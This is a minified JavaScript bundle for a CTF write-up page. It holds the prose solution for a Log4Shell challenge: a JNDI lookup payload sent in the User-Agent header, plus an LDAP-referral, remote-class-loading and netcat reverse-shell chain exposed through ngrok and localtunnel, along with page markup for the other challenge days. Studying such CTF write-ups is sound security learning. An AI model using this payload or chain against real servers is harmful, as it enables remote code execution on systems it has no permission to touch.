Y6=o(rp);sg=c(Y6,"Challenge"),Y6.forEach(s),D6.forEach(s),Hk=k(a),up=t(a,"BLOCKQUOTE",{});var Z6=o(up);kp=t(Z6,"P",{});var D3=o(kp);ng=c(D3,`We have found a service that watches our every step, are you able to figure out how we can read the FLAG from the environment? NB. Container will be restarted every 30 minutes.
`),xa=t(D3,"A",{href:!0,rel:!0,class:!0,target:!0});var J6=o(xa);eg=c(J6,"http://rsxc.no:20024"),J6.forEach(s),D3.forEach(s),Z6.forEach(s),Ak=k(a),xe=t(a,"H3",{id:!0});var j6=o(xe);hp=t(j6,"A",{href:!0});var P6=o(hp);tg=c(P6,"Solution"),P6.forEach(s),j6.forEach(s),Xk=k(a),_=t(a,"P",{});var U=o(_);og=c(U,"Looking at the challenge description I could guess from the get go that it was going to be about the new vulnerability known as Log4Shell ("),Ci=t(U,"CODE",{});var H6=o(Ci);pg=c(H6,"CVE-2021-44228"),H6.forEach(s),lg=c(U,") affecting the Java logging package "),Di=t(U,"CODE",{});var A6=o(Di);ig=c(A6,"log4j"),A6.forEach(s),cg=c(U,". To confirm this, navigating to the site, we are greeted with the sentence of "),Yi=t(U,"CODE",{});var X6=o(Yi);rg=c(X6,"Be careful, I'm logging everything..."),X6.forEach(s),ug=c(U," hinting to some form of "),Zi=t(U,"CODE",{});var q6=o(Zi);kg=c(q6,"logging"),q6.forEach(s),hg=c(U,". Fuzzing for some directories such as "),Ji=t(U,"CODE",{});var G6=o(Ji);fg=c(G6,"http://rsxc.no:20024/test"),G6.forEach(s),dg=c(U," for instance, results in a "),ji=t(U,"CODE",{});var B6=o(ji);mg=c(B6,"Whitelabel Error Page"),B6.forEach(s),bg=c(U," due to not having set up a dedicated error page yet. Googling this tells us that we are indeed working with a Java web application, running on Spring Boot:"),U.forEach(s),qk=k(a),fp=t(a,"BLOCKQUOTE",{});var $6=o(fp);Pi=t($6,"P",{});var Q6=o(Pi);gg=c(Q6,"WhiteLabel Error Page is a generic Spring Boot error page that is displayed when no custom error page is present."),Q6.forEach(s),$6.forEach(s),Gk=k(a),Ha=t(a,"P",{});var Nh=o(Ha);vg=c(Nh,"Using the site "),Ra=t(Nh,"A",{href:!0,rel:!0,class:!0,target:!0});var L6=o(Ra);_g=c(L6,"https://log4j-tester.trendmicro.com/"),L6.forEach(s),wg=c(Nh," I can test for locations suitable for the JNDI attack vector, and further finds that most of the user-supplied data and headers could actually be exploited as \u201Ceverything is being logged\u201D. For this case, I used the User-Agent header. To further test this for ourselves, preparing a netcat listener, and then curl\u2019ing the site with the JNDI payload results in a connection:"),Nh.forEach(s),Bk=k(a),Re=t(a,"PRE",{class:!0});var Ly=o(Re);Ly.forEach(s),$k=k(a),Ue=t(a,"PRE",{class:!0});var Ky=o(Ue);Ky.forEach(s),Qk=k(a),dp=t(a,"P",{});var K6=o(dp);Eg=c(K6,"The site is indeed confirmed to be vulnerable to Log4Shell!"),K6.forEach(s),Lk=k(a),mp=t(a,"P",{});var aT=o(mp);Tg=c(aT,"To exploiting the server, I setup my attack chain like so:"),aT.forEach(s),Kk=k(a),Y=t(a,"OL",{class:!0});var Up=o(Y);Ne=t(Up,"LI",{});var Wh=o(Ne);yg=c(Wh,"Begin with a payload of "),Hi=t(Wh,"CODE",{});var sT=o(Hi);Vg=c(sT,"${jndi:ldap://localhost:1389/Exploit}"),sT.forEach(s),xg=c(Wh," that reaches our LDAP Referral Server"),Wh.forEach(s),Rg=k(Up),Ai=t(Up,"LI",{});var nT=o(Ai);Ug=c(nT,"Our LDAP Referral Server then forwards the request to a secondary HTTP server http://localhost:8000/Exploit.class"),nT.forEach(s),Ng=k(Up),Xi=t(Up,"LI",{});var eT=o(Xi);Wg=c(eT,"The victim server will then retrieve and execute the code present in http://localhost:8000/Exploit.class, making it possible to run arbitrary code and command we send in"),eT.forEach(s),Up.forEach(s),ah=k(a),Q=t(a,"P",{});var Np=o(Q);Sg=c(Np,"Utilizing both the tool localtunnel ("),qi=t(Np,"CODE",{});var tT=o(qi);Mg=c(tT,"lt -port 8000"),tT.forEach(s),Ig=c(Np,") and ngrok ("),Gi=t(Np,"CODE",{});var oT=o(Gi);Og=c(oT,"ngrok tcp 1389"),oT.forEach(s),Fg=c(Np,"), I can expose my localhost connection to the Internet freely using two computers hosting the local servers for the attack. The following tunnel forwarding is in this case, as such:"),Np.forEach(s),sh=k(a),We=t(a,"PRE",{class:!0});var a4=o(We);a4.forEach(s),nh=k(a),Aa=t(a,"P",{});var Sh=o(Aa);zg=c(Sh,"First, with the "),Ua=t(Sh,"A",{href:!0,rel:!0,class:!0,target:!0});var pT=o(Ua);Cg=c(pT,"marshalsec utility"),pT.forEach(s),Dg=c(Sh,", I start my LDAP referral server to direct connections to my secondary HTTP server:"),Sh.forEach(s),eh=k(a),Se=t(a,"PRE",{class:!0});var s4=o(Se);s4.forEach(s),th=k(a),bp=t(a,"P",{});var lT=o(bp);Yg=c(lT,"Following that I set up the HTTP server, and also start the netcat listener on the other computer:"),lT.forEach(s),oh=k(a),Me=t(a,"PRE",{class:!0});var n4=o(Me);n4.forEach(s),ph=k(a),Ie=t(a,"PRE",{class:!0});var e4=o(Ie);e4.forEach(s),lh=k(a),Xa=t(a,"P",{});var Mh=o(Xa);Zg=c(Mh,"Having all the servers correctly up and running, the finishing touches for the attack payload would be to fix up the code for the exploit ("),Bi=t(Mh,"CODE",{});var iT=o(Bi);Jg=c(iT,"Exploit.class"),iT.forEach(s),jg=c(Mh,") and then running a curl to the server with our attack payload. A exploit code solution for a reverse shell can be seen below:"),Mh.forEach(s),ih=k(a),Oe=t(a,"PRE",{class:!0});var t4=o(Oe);t4.forEach(s),ch=k(a),gp=t(a,"P",{});var cT=o(gp);Pg=c(cT,"Having everything ready and set up, we run our attack:"),cT.forEach(s),rh=k(a),Fe=t(a,"PRE",{class:!0});var o4=o(Fe);o4.forEach(s),uh=k(a),qa=t(a,"P",{});var Ih=o(qa);Hg=c(Ih,"Upon running the two commands above, we receive a reverse shell on our netcat listener and can freely "),$i=t(Ih,"CODE",{});var rT=o($i);Ag=c(rT,"cat"),rT.forEach(s),Xg=c(Ih," the flag:"),Ih.forEach(s),kh=k(a),ze=t(a,"PRE",{class:!0});var p4=o(ze);p4.forEach(s),hh=k(a),Ce=t(a,"P",{});var Y3=o(Ce);qg=c(Y3,"The flag is: "),Qi=t(Y3,"CODE",{});var uT=o(Qi);Gg=c(uT,"RSXC{We_do_like_logging_right?}"),uT.forEach(s),Y3.forEach(s),this.h()},h(){r(d,"href","#day-1-the-search"),r(F,"id","day-1-the-search"),r(je,"href","#challenge"),r(Qa,"id","challenge"),r(Pe,"href","#solution"),r(Ka,"id","solution"),r(as,"class","language-shell"),r(Ae,"href","#day-2-a-magic-word"),r(ns,"id","day-2-a-magic-word"),r(Xe,"href","#challenge-1"),r(es,"id","challenge-1"),r(qe,"href","#solution-1"),r(ts,"id","solution-1"),r(os,"class","language-shell"),r(ps,"class","language-python"),r(Be,"href","#day-3-what-does-this-mean"),r(is,"id","day-3-what-does-this-mean"),r($e,"href","#challenge-2"),r(cs,"id","challenge-2"),r(K,"href","https://rsxc.no/274d11760e75cfd2c5f6a8a1198a6c19ddee702a8b7e26102e8e48f0212cc278/03-challenge.txt"),r(K,"rel","noopener"),r(K,"class","text-link"),r(K,"target","_blank"),r(Ke,"href","#solution-2"),r(rs,"id","solution-2"),r(us,"class","language-undefined"),r(aa,"href","https://gchq.github.io/CyberChef/#recipe=From_Base64(%27A-Za-z0-9%2B/%3D%27,true)From_Base58(%27rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz%27,false)Bzip2_Decompress(false)From_Base85(%27!-u%27)From_Morse_Code(%27Space%27,%27Line%20feed%27)From_Hex(%27Auto%27)From_Base32(%27A-Z2-7%3D%27,false)"),r(aa,"rel","noopener"),r(aa,"class","text-link"),r(aa,"target","_blank"),r(at,"href","#day-4-4-bytes-of-xor"),r(hs,"id","day-4-4-bytes-of-xor"),r(st,"href","#challenge-3"),r(fs,"id","challenge-3"),r(sa,"href","https://rsxc.no/e26113731cc5514c745bd8f4bdfd43a25b3a9e2286f48fba887910f16e5ad049/04-challenge.txt"),r(sa,"rel","noopener"),r(sa,"class","text-link"),r(sa,"target","_blank"),r(tt,"href","#solution-3"),r(ds,"id","solution-3"),r(ms,"class","language-python"),r(ot,"href","#day-5-plain-discussion"),r(gs,"id","day-5-plain-discussion"),r(pt,"href","#challenge-4"),r(vs,"id","challenge-4"),r(na,"href","https://rsxc.no/a28ac32e489c7714b63e26df0f8f0c71d0460e97b898299d32b30192f8f017af/05-challenge.pcap"),r(na,"rel","noopener"),r(na,"class","text-link"),r(na,"target","_blank"),r(ct,"href","#solution-4"),r(_s,"id","solution-4"),r(ws,"class","language-shell"),r(Es,"class","language-shell"),r(Ts,"class","language-shell"),r(kt,"href","#day-6-the-indecipherable-cipher"),r(Vs,"id","day-6-the-indecipherable-cipher"),r(ht,"href","#challenge-5"),r(xs,"id","challenge-5"),r(ea,"href","https://rsxc.no/af00ef8611422bdcd1606f51a55ccbccf16c6ac56a1bea01e4e725dae506aaf0/06-challenge.txt"),r(ea,"rel","noopener"),r(ea,"class","text-link"),r(ea,"target","_blank"),r(mt,"href","#solution-5"),r(Rs,"id","solution-5"),r(ta,"href","https://www.dcode.fr/cipher-identifier"),r(ta,"rel","noopener"),r(ta,"class","text-link"),r(ta,"target","_blank"),Ze(bt.src,J3="https://i.imgur.com/CpPvW5u.png")||r(bt,"src",J3),r(bt,"alt","dcode decryption"),r(gt,"href","#day-7-this-is-quite-meta"),r(Ns,"id","day-7-this-is-quite-meta"),r(vt,"href","#challenge-6"),r(Ws,"id","challenge-6"),r(oa,"href","https://rsxc.no/6c9161113dadfbb06d6865f9db5499bd701067c9d69c2452894a8fcf697d21d9/07-challenge.jpg"),r(oa,"rel","noopener"),r(oa,"class","text-link"),r(oa,"target","_blank"),r(Et,"href","#solution-6"),r(Ss,"id","solution-6"),r(Ms,"class","language-shell"),r(la,"href","https://www.dcode.fr/exif-thumbnail"),r(la,"rel","noopener"),r(la,"class","text-link"),r(la,"target","_blank"),Ze(yt.src,j3="https://i.imgur.com/b50clg5.png")||r(yt,"src",j3),r(yt,"alt","dcode decryption"),r(Vt,"href","#day-8-the-reference"),r(Os,"id","day-8-the-reference"),r(xt,"href","#challenge-7"),r(Fs,"id","challenge-7"),r(ia,"href","http://rsxc.no:20008/"),r(ia,"rel","noopener"),r(ia,"class","text-link"),r(ia,"target","_blank"),r(Nt,"href","#solution-7"),r(zs,"id","solution-7"),r(Wt,"href","#day-9-the-reference-2"),r(Ds,"id","day-9-the-reference-2"),r(St,"href","#challenge-8"),r(Ys,"id","challenge-8"),r(ca,"href","http://rsxc.no:20009/"),r(ca,"rel","noopener"),r(ca,"class","text-link"),r(ca,"target","_blank"),r(Ot,"href","#solution-8"),r(Zs,"id","solution-8"),Ze(Ft.src,P3="https://i.imgur.com/OqEYN2c.png")||r(Ft,"src",P3),r(Ft,"alt","crackstation hash lookup"),r(Js,"class","language-shell"),r(ra,"href","http://rsxc.no:20009/notes.php?id=65b29a77142a5c237d7b21c005b72157"),r(ra,"rel","noopener"),r(ra,"class","text-link"),r(ra,"target","_blank"),r(js,"class","language-shell"),r(Ct,"href","#day-10-lookup"),r(Hs,"id","day-10-lookup"),r(Dt,"href","#challenge-9"),r(As,"id","challenge-9"),r(ua,"href","http://rsxc.no:20010/"),r(ua,"rel","noopener"),r(ua,"class","text-link"),r(ua,"target","_blank"),r(Jt,"href","#solution-9"),r(Xs,"id","solution-9"),r(qs,"class","language-shell"),r(jt,"href","#day-11-the-not-so-random-prime"),r(Bs,"id","day-11-the-not-so-random-prime"),r(Pt,"href","#challenge-10"),r($s,"id","challenge-10"),r(ka,"href","https://rsxc.no/af6c1a2345b4de89831605d6c9cd9307b6b54df0bd6bd8c506317277119457e8/11-challenge.zip"),r(ka,"rel","noopener"),r(ka,"class","text-link"),r(ka,"target","_blank"),r(Xt,"href","#solution-10"),r(Qs,"id","solution-10"),r(Ls,"class","language-python"),r(qt,"href","#day-12-twelve-seconds-of-encoding"),r(an,"id","day-12-twelve-seconds-of-encoding"),r(Gt,"href","#challenge-11"),r(sn,"id","challenge-11"),r($t,"href","#solution-11"),r(nn,"id","solution-11"),r(en,"class","language-python"),r(Lt,"href","#day-13-new-technology-is-hard"),r(on,"id","day-13-new-technology-is-hard"),r(Kt,"href","#challenge-12"),r(pn,"id","challenge-12"),r(ha,"href","http://rsxc.no:20013/"),r(ha,"rel","noopener"),r(ha,"class","text-link"),r(ha,"target","_blank"),r(no,"href","#solution-12"),r(ln,"id","solution-12"),r(cn,"class","language-jsx"),r(rn,"class","language-shell"),r(to,"href","#day-14-jwt"),r(kn,"id","day-14-jwt"),r(oo,"href","#challenge-13"),r(hn,"id","challenge-13"),r(fa,"href","http://rsxc.no:20014/"),r(fa,"rel","noopener"),r(fa,"class","text-link"),r(fa,"target","_blank"),r(io,"href","#solution-13"),r(fn,"id","solution-13"),r(ma,"href","https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens"),r(ma,"rel","noopener"),r(ma,"class","text-link"),r(ma,"target","_blank"),Ze(co.src,H3="https://i.imgur.com/Qjl9Ol4.png")||r(co,"src",H3),r(co,"alt","jwt output"),r(dn,"class","language-shell"),r(uo,"href","#day-15-jwt-2"),r(bn,"id","day-15-jwt-2"),r(ko,"href","#challenge-14"),r(gn,"id","challenge-14"),r(ba,"href","http://rsxc.no:20015/"),r(ba,"rel","noopener"),r(ba,"class","text-link"),r(ba,"target","_blank"),r(mo,"href","#solution-14"),r(vn,"id","solution-14"),r(ga,"href","https://github.com/ticarpi/jwt_tool"),r(ga,"rel","noopener"),r(ga,"class","text-link"),r(ga,"target","_blank"),r(_n,"class","language-shell"),r(wn,"class","language-shell"),r(bo,"href","#day-16-a-scary-command"),r(Tn,"id","day-16-a-scary-command"),r(go,"href","#challenge-15"),r(yn,"id","challenge-15"),r(va,"href","https://rsxc.no/dfb61488866658d31e3e7ccd2287caf233108a7eb917da6aefde3792d0fd79d2/16-challenge.sh"),r(va,"rel","noopener"),r(va,"class","text-link"),r(va,"target","_blank"),r(wo,"href","#solution-15"),r(Vn,"id","solution-15"),r(xn,"class","language-bash"),r(Rn,"class","language-shell"),r(Un,"class","language-shell"),r(Nn,"class","language-bash"),r(Wn,"class","language-shell"),r(Sn,"class","language-bash"),r(Mn,"class","language-bash"),r(In,"class","language-shell"),r(yo,"href","#day-17-my-xmas-card"),r(Fn,"id","day-17-my-xmas-card"),r(Vo,"href","#challenge-16"),r(zn,"id","challenge-16"),r(_a,"href","http://rsxc.no:20017/"),r(_a,"rel","noopener"),r(_a,"class","text-link"),r(_a,"target","_blank"),r(Uo,"href","#solution-16"),r(Cn,"id","solution-16"),r(Dn,"class","language-php"),r(Yn,"class","language-php"),r(Zn,"class","language-shell"),r(No,"href","#day-18-remember-the-flag-docker-remembers"),r(jn,"id","day-18-remember-the-flag-docker-remembers"),r(Wo,"href","#challenge-17"),r(Pn,"id","challenge-17"),r(wa,"href","https://rsxc.no/798d1de7d544fe090786f5930d137b863ff46dd19a018882ed2812a835517d1b/18-challenge.zip"),r(wa,"rel","noopener"),r(wa,"class","text-link"),r(wa,"target","_blank"),r(Io,"href","#solution-17"),r(Hn,"id","solution-17"),r(An,"class","language-shell"),r(Oo,"href","#day-19-the-inclusive-xmas-cards"),r(qn,"id","day-19-the-inclusive-xmas-cards"),r(Fo,"href","#challenge-18"),r(Gn,"id","challenge-18"),r(Ea,"href","http://rsxc.no:20019/"),r(Ea,"rel","noopener"),r(Ea,"class","text-link"),r(Ea,"target","_blank"),r(Do,"href","#solution-18"),r(Bn,"id","solution-18"),r($n,"class","language-shell"),r(Qn,"class","language-shell"),r(Yo,"href","#day-20-easy-mistakes"),r(Kn,"id","day-20-easy-mistakes"),r(Zo,"href","#challenge-19"),r(ae,"id","challenge-19"),r(Ta,"href","http://rsxc.no:20020/"),r(Ta,"rel","noopener"),r(Ta,"class","text-link"),r(Ta,"target","_blank"),r(Po,"href","#solution-19"),r(se,"id","solution-19"),r(ne,"class","language-php"),r(ee,"class","language-shell"),r(Ao,"href","#day-21-nice-memories"),r(oe,"id","day-21-nice-memories"),r(Xo,"href","#challenge-20"),r(pe,"id","challenge-20"),r(ya,"href","https://rsxc.no/35a2c6961adc6886665363b6f47c3a156356a91a4cf602416b250aa4daca4167/21-challenge.zip"),r(ya,"rel","noopener"),r(ya,"class","text-link"),r(ya,"target","_blank"),r(Bo,"href","#solution-20"),r(le,"id","solution-20"),r(ie,"class","language-shell"),r(ce,"class","language-shell"),r($o,"href","#day-22-wireless-communication"),r(ue,"id","day-22-wireless-communication"),r(Qo,"href","#challenge-21"),r(ke,"id","challenge-21"),r(Ko,"href","#solution-21"),r(he,"id","solution-21"),r(fe,"class","language-python="),r(de,"class","language-undefined"),Ze(sp.src,A3="https://i.imgur.com/f1wYfVS.png")||r(sp,"src",A3),r(sp,"alt","wireshark decryption key preferences"),Ze(np.src,X3="https://i.imgur.com/ya1nPMb.png")||r(np,"src",X3),r(np,"alt","wireshark decryption key added"),Ze(ep.src,q3="https://i.imgur.com/6GndJFX.png")||r(ep,"src",q3),r(ep,"alt","wireshark flag output"),r(tp,"href","#day-23-locating-the-location"),r(ge,"id","day-23-locating-the-location"),r(op,"href","#challenge-22"),r(ve,"id","challenge-22"),r(Va,"href","http://rsxc.no:20023/"),r(Va,"rel","noopener"),r(Va,"class","text-link"),r(Va,"target","_blank"),r(ip,"href","#solution-22"),r(_e,"id","solution-22"),r(we,"class","language-python"),r(Ee,"class","language-shell"),r(cp,"href","#day-24-the-watcher"),r(ye,"id","day-24-the-watcher"),r(rp,"href","#challenge-23"),r(Ve,"id","challenge-23"),r(xa,"href","http://rsxc.no:20024/"),r(xa,"rel","noopener"),r(xa,"class","text-link"),r(xa,"target","_blank"),r(hp,"href","#solution-23"),r(xe,"id","solution-23"),r(Ra,"href","https://log4j-tester.trendmicro.com/"),r(Ra,"rel","noopener"),r(Ra,"class","text-link"),r(Ra,"target","_blank"),r(Re,"class","language-shell"),r(Ue,"class","language-shell"),r(Y,"class","list"),r(We,"class","language-undefined"),r(Ua,"href","https://github.com/mbechler/marshalsec"),r(Ua,"rel","noopener"),r(Ua,"class","text-link"),r(Ua,"target","_blank"),r(Se,"class","language-shell"),r(Me,"class","language-shell"),r(Ie,"class","language-shell"),r(Oe,"class","language-java"),r(Fe,"class","language-shell"),r(ze,"class","language-shell")},m(a,p){l(a,f,p),n(f,Z),l(a,J,p),l(a,F,p),n(F,d),n(d,z),l(a,$a,p),l(a,Qa,p),n(Qa,je),n(je,Oh),l(a,ac,p),l(a,Wa,p),n(Wa,La),n(La,Fh),n(La,Wp),n(Wp,zh),n(La,Ch),n(Wa,Dh),n(Wa,Sp),n(Sp,Yh),l(a,sc,p),l(a,Ka,p),n(Ka,Pe),n(Pe,Zh),l(a,nc,p),l(a,He,p),n(He,Jh),l(a,ec,p),l(a,as,p),as.innerHTML=dT,l(a,tc,p),l(a,ss,p),n(ss,jh),n(ss,Mp),n(Mp,Ph),l(a,oc,p),l(a,ns,p),n(ns,Ae),n(Ae,Hh),l(a,pc,p),l(a,es,p),n(es,Xe),n(Xe,Ah),l(a,lc,p),l(a,Sa,p),n(Sa,Ip),n(Ip,Xh),n(Sa,qh),n(Sa,Op),n(Op,Gh),l(a,ic,p),l(a,ts,p),n(ts,qe),n(qe,Bh),l(a,cc,p),l(a,j,p),n(j,$h),n(j,Fp),n(Fp,Qh),n(j,Lh),n(j,zp),n(zp,Kh),n(j,af),l(a,rc,p),l(a,os,p),os.innerHTML=mT,l(a,uc,p),l(a,Ge,p),n(Ge,sf),l(a,kc,p),l(a,ps,p),ps.innerHTML=bT,l(a,hc,p),l(a,ls,p),n(ls,nf),n(ls,Cp),n(Cp,ef),l(a,fc,p),l(a,is,p),n(is,Be),n(Be,tf),l(a,dc,p),l(a,cs,p),n(cs,$e),n($e,of),l(a,mc,p),l(a,Qe,p),n(Qe,Le),n(Le,pf),n(Le,K),n(K,lf),l(a,bc,p),l(a,rs,p),n(rs,Ke),n(Ke,cf),l(a,gc,p),l(a,us,p),us.innerHTML=gT,l(a,vc,p),l(a,ks,p),n(ks,rf),n(ks,aa),n(aa,uf),l(a,_c,p),l(a,Ma,p),n(Ma,kf),n(Ma,Dp),n(Dp,hf),n(Ma,ff),l(a,wc,p),l(a,hs,p),n(hs,at),n(at,df),l(a,Ec,p),l(a,fs,p),n(fs,st),n(st,mf),l(a,Tc,p),l(a,nt,p),n(nt,et),n(et,bf),n(et,sa),n(sa,gf),l(a,yc,p),l(a,ds,p),n(ds,tt),n(tt,vf),l(a,Vc,p),l(a,Ia,p),n(Ia,_f),n(Ia,Yp),n(Yp,wf),n(Ia,Ef),l(a,xc,p),l(a,ms,p),ms.innerHTML=vT,l(a,Rc,p),l(a,bs,p),n(bs,Tf),n(bs,Zp),n(Zp,yf),l(a,Uc,p),l(a,gs,p),n(gs,ot),n(ot,Vf),l(a,Nc,p),l(a,vs,p),n(vs,pt),n(pt,xf),l(a,Wc,p),l(a,lt,p),n(lt,it),n(it,Rf),n(it,na),n(na,Uf),l(a,Sc,p),l(a,_s,p),n(_s,ct),n(ct,Nf),l(a,Mc,p),l(a,rt,p),n(rt,Wf),l(a,Ic,p),l(a,ws,p),ws.innerHTML=_T,l(a,Oc,p),l(a,Oa,p),n(Oa,Sf),n(Oa,Jp),n(Jp,Mf),n(Oa,If),l(a,Fc,p),l(a,Es,p),Es.innerHTML=wT,l(a,zc,p),l(a,ut,p),n(ut,Of),l(a,Cc,p),l(a,Ts,p),Ts.innerHTML=ET,l(a,Dc,p),l(a,ys,p),n(ys,Ff),n(ys,jp),n(jp,zf),l(a,Yc,p),l(a,Vs,p),n(Vs,kt),n(kt,Cf),l(a,Zc,p),l(a,xs,p),n(xs,ht),n(ht,Df),l(a,Jc,p),l(a,ft,p),n(ft,dt),n(dt,Yf),n(dt,ea),n(ea,Zf),l(a,jc,p),l(a,Rs,p),n(Rs,mt),n(mt,Jf),l(a,Pc,p),l(a,N,p),n(N,jf),n(N,ta),n(ta,Pf),n(N,Hf),n(N,Pp),n(Pp,Af),n(N,Xf),n(N,Hp),n(Hp,qf),n(N,Gf),n(N,bt),l(a,Hc,p),l(a,Us,p),n(Us,Bf),n(Us,Ap),n(Ap,$f),l(a,Ac,p),l(a,Ns,p),n(Ns,gt),n(gt,Qf),l(a,Xc,p),l(a,Ws,p),n(Ws,vt),n(vt,Lf),l(a,qc,p),l(a,_t,p),n(_t,wt),n(wt,Kf),n(wt,oa),n(oa,ad),l(a,Gc,p),l(a,Ss,p),n(Ss,Et),n(Et,sd),l(a,Bc,p),l(a,Tt,p),n(Tt,nd),l(a,$c,p),l(a,Ms,p),Ms.innerHTML=TT,l(a,Qc,p),l(a,pa,p),n(pa,ed),n(pa,la),n(la,td),n(pa,od),n(pa,yt),l(a,Lc,p),l(a,Is,p),n(Is,pd),n(Is,Xp),n(Xp,ld),l(a,Kc,p),l(a,Os,p),n(Os,Vt),n(Vt,id),l(a,ar,p),l(a,Fs,p),n(Fs,xt),n(xt,cd),l(a,sr,p),l(a,Rt,p),n(Rt,Ut),n(Ut,rd),n(Ut,ia),n(ia,ud),l(a,nr,p),l(a,zs,p),n(zs,Nt),n(Nt,kd),l(a,er,p),l(a,V,p),n(V,hd),n(V,qp),n(qp,fd),n(V,dd),n(V,Gp),n(Gp,md),n(V,bd),n(V,Bp),n(Bp,gd),n(V,vd),n(V,$p),n($p,_d),n(V,wd),l(a,tr,p),l(a,Cs,p),n(Cs,Ed),n(Cs,Qp),n(Qp,Td),l(a,or,p),l(a,Ds,p),n(Ds,Wt),n(Wt,yd),l(a,pr,p),l(a,Ys,p),n(Ys,St),n(St,Vd),l(a,lr,p),l(a,Mt,p),n(Mt,It),n(It,xd),n(It,ca),n(ca,Rd),l(a,ir,p),l(a,Zs,p),n(Zs,Ot),n(Ot,Ud),l(a,cr,p),l(a,C,p),n(C,Nd),n(C,Lp),n(Lp,Wd),n(C,Sd),n(C,Kp),n(Kp,Md),n(C,Id),n(C,Ft),l(a,rr,p),l(a,zt,p),n(zt,Od),l(a,ur,p),l(a,Js,p),Js.innerHTML=yT,l(a,kr,p),l(a,P,p),n(P,Fd),n(P,ra),n(ra,zd),n(P,Cd),n(P,al),n(al,Dd),n(P,Yd),l(a,hr,p),l(a,js,p),js.innerHTML=VT,l(a,fr,p),l(a,Ps,p),n(Ps,Zd),n(Ps,sl),n(sl,Jd),l(a,dr,p),l(a,Hs,p),n(Hs,Ct),n(Ct,jd),l(a,mr,p),l(a,As,p),n(As,Dt),n(Dt,Pd),l(a,br,p),l(a,Yt,p),n(Yt,Zt),n(Zt,Hd),n(Zt,ua),n(ua,Ad),l(a,gr,p),l(a,Xs,p),n(Xs,Jt),n(Jt,Xd),l(a,vr,p),l(a,H,p),n(H,qd),n(H,nl),n(nl,Gd),n(H,Bd),n(H,el),n(el,$d),n(H,Qd),l(a,_r,p),l(a,qs,p),qs.innerHTML=xT,l(a,wr,p),l(a,Gs,p),n(Gs,Ld),n(Gs,tl),n(tl,Kd),l(a,Er,p),l(a,Bs,p),n(Bs,jt),n(jt,am),l(a,Tr,p),l(a,$s,p),n($s,Pt),n(Pt,sm),l(a,yr,p),l(a,Ht,p),n(Ht,At),n(At,nm),n(At,ka),n(ka,em),l(a,Vr,p),l(a,Qs,p),n(Qs,Xt),n(Xt,tm),l(a,xr,p),l(a,Fa,p),n(Fa,om),n(Fa,ol),n(ol,pm),n(Fa,lm),l(a,Rr,p),l(a,A,p),n(A,im),n(A,pl),n(pl,cm),n(A,rm),n(A,ll),n(ll,um),n(A,km),l(a,Ur,p),l(a,Ls,p),Ls.innerHTML=RT,l(a,Nr,p),l(a,Ks,p),n(Ks,hm),n(Ks,il),n(il,fm),l(a,Wr,p),l(a,an,p),n(an,qt),n(qt,dm),l(a,Sr,p),l(a,sn,p),n(sn,Gt),n(Gt,mm),l(a,Mr,p),l(a,Bt,p),n(Bt,cl),n(cl,bm),l(a,Ir,p),l(a,nn,p),n(nn,$t),n($t,gm),l(a,Or,p),l(a,Qt,p),n(Qt,vm),l(a,Fr,p),l(a,en,p),en.innerHTML=UT,l(a,zr,p),l(a,tn,p),n(tn,_m),n(tn,rl),n(rl,wm),l(a,Cr,p),l(a,on,p),n(on,Lt),n(Lt,Em),l(a,Dr,p),l(a,pn,p),n(pn,Kt),n(Kt,Tm),l(a,Yr,p),l(a,ao,p),n(ao,so),n(so,ym),n(so,ha),n(ha,Vm),l(a,Zr,p),l(a,ln,p),n(ln,no),n(no,xm),l(a,Jr,p),l(a,za,p),n(za,Rm),n(za,ul),n(ul,Um),n(za,Nm),l(a,jr,p),l(a,cn,p),cn.innerHTML=NT,l(a,Pr,p),l(a,eo,p),n(eo,Wm),l(a,Hr,p),l(a,rn,p),rn.innerHTML=WT,l(a,Ar,p),l(a,un,p),n(un,Sm),n(un,kl),n(kl,Mm),l(a,Xr,p),l(a,kn,p),n(kn,to),n(to,Im),l(a,qr,p),l(a,hn,p),n(hn,oo),n(oo,Om),l(a,Gr,p),l(a,po,p),n(po,lo),n(lo,Fm),n(lo,fa),n(fa,zm),l(a,Br,p),l(a,fn,p),n(fn,io),n(io,Cm),l(a,$r,p),l(a,da,p),n(da,Dm),n(da,ma),n(ma,Ym),n(da,Zm),n(da,co),l(a,Qr,p),l(a,ro,p),n(ro,Jm),l(a,Lr,p),l(a,dn,p),dn.innerHTML=ST,l(a,Kr,p),l(a,mn,p),n(mn,jm),n(mn,hl),n(hl,Pm),l(a,au,p),l(a,bn,p),n(bn,uo),n(uo,Hm),l(a,su,p),l(a,gn,p),n(gn,ko),n(ko,Am),l(a,nu,p),l(a,ho,p),n(ho,fo),n(fo,Xm),n(fo,ba),n(ba,qm),l(a,eu,p),l(a,vn,p),n(vn,mo),n(mo,Gm),l(a,tu,p),l(a,h,p),n(h,Bm),n(h,fl),n(fl,$m),n(h,Qm),n(h,dl),n(dl,Lm),n(h,Km),n(h,ml),n(ml,a1),n(h,s1),n(h,bl),n(bl,n1),n(h,e1),n(h,gl),n(gl,t1),n(h,o1),n(h,ga),n(ga,p1),n(h,l1),n(h,vl),n(vl,i1),n(h,c1),n(h,_l),n(_l,r1),n(h,u1),n(h,wl),n(wl,k1),n(h,h1),l(a,ou,p),l(a,_n,p),_n.innerHTML=MT,l(a,pu,p),l(a,wn,p),wn.innerHTML=IT,l(a,lu,p),l(a,En,p),n(En,f1),n(En,El),n(El,d1),l(a,iu,p),l(a,Tn,p),n(Tn,bo),n(bo,m1),l(a,cu,p),l(a,yn,p),n(yn,go),n(go,b1),l(a,ru,p),l(a,vo,p),n(vo,_o),n(_o,g1),n(_o,va),n(va,v1),l(a,uu,p),l(a,Vn,p),n(Vn,wo),n(wo,_1),l(a,ku,p),l(a,Ca,p),n(Ca,w1),n(Ca,Tl),n(Tl,E1),n(Ca,T1),l(a,hu,p),l(a,xn,p),xn.innerHTML=OT,l(a,fu,p),l(a,Rn,p),Rn.innerHTML=FT,l(a,du,p),l(a,Da,p),n(Da,y1),n(Da,yl),n(yl,V1),n(Da,x1),l(a,mu,p),l(a,Un,p),Un.innerHTML=zT,l(a,bu,p),l(a,Ya,p),n(Ya,R1),n(Ya,Vl),n(Vl,U1),n(Ya,N1),l(a,gu,p),l(a,Nn,p),Nn.innerHTML=CT,l(a,vu,p),l(a,Eo,p),n(Eo,W1),l(a,_u,p),l(a,Wn,p),Wn.innerHTML=DT,l(a,wu,p),l(a,X,p),n(X,S1),n(X,xl),n(xl,M1),n(X,I1),n(X